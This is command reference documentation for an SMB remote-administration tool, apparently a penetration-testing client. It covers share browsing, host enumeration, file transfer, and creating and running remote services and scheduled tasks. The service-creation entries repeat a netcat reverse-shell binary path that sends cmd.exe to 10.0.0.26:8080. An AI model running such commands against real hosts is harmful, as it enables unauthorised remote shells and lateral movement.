# CLI Commands Documentation

## `use`

**Description:** Connect to a specific share on the remote server

**Help:**
```
usage: use [-h] share
Connect to a specific share on the remote server
```

**Example Usage:**
```
Example Usage: use <sharename> | use C$
```

### Arguments

- **`share`**: Specify the share name to connect to
  - Required: Yes

---

## `ls`

**Description:** List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [--sort-reverse]
          [-l] [-r depth] [-o filename] [--show] [--type {f,d,a}]
          [path]
List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: ls /path/to/directory
ls --type f -l          # List only files in long format
ls --type d             # List only directories
ls --type f -r 2        # Recursively list only files to depth 2
```

### Arguments

- **`path`**: Path to list contents, defaults to current path
  - Default: `.`
  - Required: No

- **`sort`**: Sort the directory contents by name, size, or date
  - Choices: name, size, created, lastaccess, lastwrite
  - Default: `date`
  - Required: No

- **`recursive`**: Recursively list directory contents with X depth
  - Required: No

- **`output`**: Save output to file
  - Required: No

- **`type`**: Filter by type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

---

## `find`

**Description:** Search for files and directories across the remote share with advanced filtering options.

**Help:**
```
usage: find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE] [--mtime MTIME]
            [--ctime CTIME] [--atime ATIME] [--regex] [--iname]
            [--maxdepth MAXDEPTH] [--mindepth MINDEPTH] [--limit LIMIT]
            [--sort {name,size,mtime,ctime,atime}] [--reverse]
            [--format {table,list,paths,json}] [-o OUTPUT] [--empty]
            [--hidden] [--progress] [--timeout TIMEOUT]
            pattern
Search for files and directories across the remote share with advanced filtering options.
```

**Example Usage:**
```
Example Usage: find "*.txt" -path /Users -type f -size +1MB
```

### Arguments

- **`pattern`**: Search pattern (supports wildcards like *.txt or regex with -regex flag)
  - Required: Yes

- **`path`**: Starting search path (default: current directory)
  - Default: `.`
  - Required: No

- **`type`**: Search type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

- **`size`**: File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)
  - Required: No

- **`mtime`**: Modified within N days (positive number)
  - Required: No

- **`ctime`**: Created within N days (positive number)
  - Required: No

- **`atime`**: Accessed within N days (positive number)
  - Required: No

- **`maxdepth`**: Maximum search depth
  - Default: `2`
  - Required: No

- **`mindepth`**: Minimum search depth
  - Default: `0`
  - Required: No

- **`limit`**: Maximum number of results to return
  - Required: No

- **`sort`**: Sort results by field
  - Choices: name, size, mtime, ctime, atime
  - Default: `name`
  - Required: No

- **`format`**: Output format
  - Choices: table, list, paths, json
  - Default: `table`
  - Required: No

- **`output`**: Save results to file
  - Required: No

- **`timeout`**: Search timeout in seconds
  - Default: `120`
  - Required: No

---

## `shares`

**Description:** List all shares available on the remote server

**Help:**
```
usage: shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumshares`

**Description:** List all shares available on the remote server

**Help:**
```
usage: shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumpipes`

**Description:** Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.

**Help:**
```
usage: enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
                 [--output filename]
Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
```

**Example Usage:**
```
Example Usage: enumpipes --detailed --output pipes.txt
```

### Arguments

- **`method`**: Enumeration method to use
  - Choices: smb, rpc, hybrid
  - Default: `hybrid`
  - Required: No

- **`output`**: Save output to specified file
  - Required: No

---

## `cat`

**Description:** Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: cat [-h] remote_path
Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cat /path/to/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to display contents
  - Required: Yes

---

## `cd`

**Description:** Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: cd [-h] [path]
Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cd /path/to/directory
```

### Arguments

- **`path`**: Directory path to change to, defaults to current directory
  - Default: `.`
  - Required: No

---

## `pwd`

**Description:** Print the current working directory on the remote server

**Help:**
```
usage: pwd [-h]
Print the current working directory on the remote server
```

**Example Usage:**
```
Example Usage: pwd
```

---

## `exit`

**Description:** Exit the application

**Help:**
```
usage: exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `quit`

**Description:** Exit the application

**Help:**
```
usage: exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logout`

**Description:** Exit the application

**Help:**
```
usage: exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logoff`

**Description:** Exit the application

**Help:**
```
usage: exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `clear`

**Description:** Clear the screen

**Help:**
```
usage: clear [-h]
Clear the screen
```

**Example Usage:**
```
Example Usage: clear
```

---

## `help`

**Description:** Display help information for the application

**Help:**
```
usage: help [-h] [--verbose] [cmd]
Display help information for the application
```

**Example Usage:**
```
Example Usage: help
```

### Arguments

- **`cmd`**: Specify a command to show help for
  - Required: No

---

## `reconnect`

**Description:** Reconnect to the server to fix broken pipe or connection errors

**Help:**
```
usage: reconnect [-h]
Reconnect to the server to fix broken pipe or connection errors
```

**Example Usage:**
```
Use this command when you encounter '[Errno 32] Broken pipe' errors
```

---

## `who`

**Description:** List the current sessions connected to the target host

**Help:**
```
usage: who [-h]
List the current sessions connected to the target host
```

**Example Usage:**
```
Example Usage: who
```

---

## `enumdisk`

**Description:** Enumerate server disk information

**Help:**
```
usage: enumdisk [-h]
Enumerate server disk information
```

**Example Usage:**
```
Example Usage: enumdisk
```

---

## `enumlogons`

**Description:** Enumerate users currently logged on the server

**Help:**
```
usage: enumlogons [-h]
Enumerate users currently logged on the server
```

**Example Usage:**
```
Example Usage: enumlogons
```

---

## `enuminfo`

**Description:** Enumerate detailed information about the remote host

**Help:**
```
usage: enuminfo [-h]
Enumerate detailed information about the remote host
```

**Example Usage:**
```
Example Usage: enuminfo
```

---

## `enumsys`

**Description:** Enumerate system information of the remote host

**Help:**
```
usage: enumsys [-h]
Enumerate system information of the remote host
```

**Example Usage:**
```
Example Usage: enumsys
```

---

## `enumtransport`

**Description:** Enumerate transport information of the remote host

**Help:**
```
usage: enumtransport [-h]
Enumerate transport information of the remote host
```

**Example Usage:**
```
Example Usage: enumtransport
```

---

## `enumservices`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `servicesenum`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `svcenum`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `services`

**Description:** Enumerate services on the remote host

**Help:**
```
usage: enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `serviceshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `svcshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `showservice`

**Description:** Show details of a specific service on the remote server

**Help:**
```
usage: serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `servicestart`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `svcstart`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicerun`

**Description:** Start a specified service on the remote server

**Help:**
```
usage: servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicestop`

**Description:** Stop a specified service on the remote server

**Help:**
```
usage: servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `svcstop`

**Description:** Stop a specified service on the remote server

**Help:**
```
usage: servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `serviceenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `svcenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enableservice`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enablesvc`

**Description:** Enable a specified service on the remote server

**Help:**
```
usage: serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `servicedisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `svcdisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disableservice`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disablesvc`

**Description:** Disable a specified service on the remote server

**Help:**
```
usage: servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `servicedel`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `svcdelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `servicedelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
usage: servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `serviceadd`

**Description:** Create a new service on the remote server

**Help:**
```
usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                  -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svcadd`

**Description:** Create a new service on the remote server

**Help:**
```
usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                  -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicecreate`

**Description:** Create a new service on the remote server

**Help:**
```
usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                  -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svccreate`

**Description:** Create a new service on the remote server

**Help:**
```
usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                  -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicemodify`

**Description:** Modify service binary path, display name, start type, or account

**Help:**
```
usage: servicemodify [-h] [--binary-path BINARY_PATH]
                     [--display-name DISPLAY_NAME]
                     [--start-type {auto,demand,disabled,system}]
                     [--account ACCOUNT] [--password PASSWORD]
                     [-i SERVICEID | service_name]
Modify service binary path, display name, start type, or account
```

**Example Usage:**
```
Examples:
  servicemodify Spooler --start-type demand
  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"

```

### Arguments

- **`serviceid`**: Specify the service ID
  - Required: No

- **`service_name`**: Specify the service name
  - Required: No

- **`binary_path`**: New binary path for the service
  - Required: No

- **`display_name`**: New display name for the service
  - Required: No

- **`start_type`**: New start type for the service
  - Choices: auto, demand, disabled, system
  - Required: No

- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
  - Required: No

- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
  - Required: No

---

## `svcmodify`

**Description:** Modify service binary path, display name, start type, or account

**Help:**
```
usage: servicemodify [-h] [--binary-path BINARY_PATH]
                     [--display-name DISPLAY_NAME]
                     [--start-type {auto,demand,disabled,system}]
                     [--account ACCOUNT] [--password PASSWORD]
                     [-i SERVICEID | service_name]
Modify service binary path, display name, start type, or account
```

**Example Usage:**
```
Examples:
  servicemodify Spooler --start-type demand
  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"

```

### Arguments

- **`serviceid`**: Specify the service ID
  - Required: No

- **`service_name`**: Specify the service name
  - Required: No

- **`binary_path`**: New binary path for the service
  - Required: No

- **`display_name`**: New display name for the service
  - Required: No

- **`start_type`**: New start type for the service
  - Choices: auto, demand, disabled, system
  - Required: No

- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
  - Required: No

- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
  - Required: No

---

## `modifyservice`

**Description:** Modify service binary path, display name, start type, or account

**Help:**
```
usage: servicemodify [-h] [--binary-path BINARY_PATH]
                     [--display-name DISPLAY_NAME]
                     [--start-type {auto,demand,disabled,system}]
                     [--account ACCOUNT] [--password PASSWORD]
                     [-i SERVICEID | service_name]
Modify service binary path, display name, start type, or account
```

**Example Usage:**
```
Examples:
  servicemodify Spooler --start-type demand
  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"

```

### Arguments

- **`serviceid`**: Specify the service ID
  - Required: No

- **`service_name`**: Specify the service name
  - Required: No

- **`binary_path`**: New binary path for the service
  - Required: No

- **`display_name`**: New display name for the service
  - Required: No

- **`start_type`**: New start type for the service
  - Choices: auto, demand, disabled, system
  - Required: No

- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
  - Required: No

- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
  - Required: No

---

## `enumtasks`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `tasksenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
usage: enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `tasksshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `showtask`

**Description:** Show details of a specific task on the remote server

**Help:**
```
usage: taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `taskcreate`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
                  [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskadd`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
                  [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskimport`

**Description:** Import a scheduled task from a local XML definition file

**Help:**
```
usage: taskimport [-h] -f FILE [-n NAME] [-d FOLDER] [--test] [--force]
Import a scheduled task from a local XML definition file
```

**Example Usage:**
```
Example Usage: taskimport -f task.xml --test | taskimport -f task.xml -n MyTask -d \\MyFolder
```

### Arguments

- **`file`**: Path to local XML task definition file
  - Required: Yes

- **`name`**: Task name (extracted from XML URI if omitted)
  - Required: No

- **`folder`**: Task Scheduler folder (default: root)
  - Default: ``
  - Required: No

---

## `taskrun`

**Description:** Run a specified task on the remote server

**Help:**
```
usage: taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskexec`

**Description:** Run a specified task on the remote server

**Help:**
```
usage: taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskdelete`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: taskdelete [-h] (-i TASK_ID | task_path)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskdel`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: taskdelete [-h] (-i TASK_ID | task_path)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskrm`

**Description:** Delete a specified task on the remote server

**Help:**
```
usage: taskdelete [-h] (-i TASK_ID | task_path)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `time`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
usage: time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `enumtime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
usage: time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `servertime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
usage: time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `upload`

**Description:** Upload a file to the remote server

**Help:**
```
usage: upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `put`

**Description:** Upload a file to the remote server

**Help:**
```
usage: upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `download`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
                remote_path [local_path]
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `get`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
                remote_path [local_path]
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `mget`

**Description:** Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.

**Help:**
```
usage: mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: mget /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote directory path to download from
  - Required: No

- **`local_path`**: Specify the local directory path where files will be downloaded
  - Required: No

- **`p`**: Specify a regex pattern to match filenames
  - Required: No

- **`d`**: Specify folder depth count for recursion
  - Default: `2`
  - Required: No

---

## `mkdir`

**Description:** Create a new directory on the remote server

**Help:**
```
usage: mkdir [-h] path
Create a new directory on the remote server
```

**Example Usage:**
```
Example Usage: mkdir /path/to/new/directory
```

### Arguments

- **`path`**: Specify the path of the directory to create
  - Required: Yes

---

## `rmdir`

**Description:** Remove a directory on the remote server

**Help:**
```
usage: rmdir [-h] remote_path
Remove a directory on the remote server
```

**Example Usage:**
```
Example Usage: rmdir /path/to/remote/directory
```

### Arguments

- **`remote_path`**: Specify the remote path of the directory to remove
  - Required: Yes

---

## `rm`

**Description:** Delete one or more files on the remote server

**Help:**
```
usage: rm [-h] [-n FILE_LIST] [remote_path]
Delete one or more files on the remote server
```

